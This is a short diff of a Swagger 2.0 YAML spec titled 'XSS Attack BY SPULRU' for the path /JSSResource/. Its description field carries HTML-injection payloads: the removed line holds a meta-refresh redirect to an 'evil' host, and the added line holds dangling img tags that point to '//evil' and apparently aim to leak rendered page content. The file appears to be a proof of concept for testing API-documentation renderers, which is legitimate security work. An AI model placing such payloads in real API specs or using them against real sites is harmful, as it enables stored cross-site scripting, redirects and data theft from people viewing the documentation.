@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: XSS Attack BY SPULRU
-  description: </p><meta http-equiv="refresh" content="0; http://evil?<p>
+  description: </p><img src="//evil? <image src="//evil? <p>
     
   version: production
 basePath: /JSSResource/
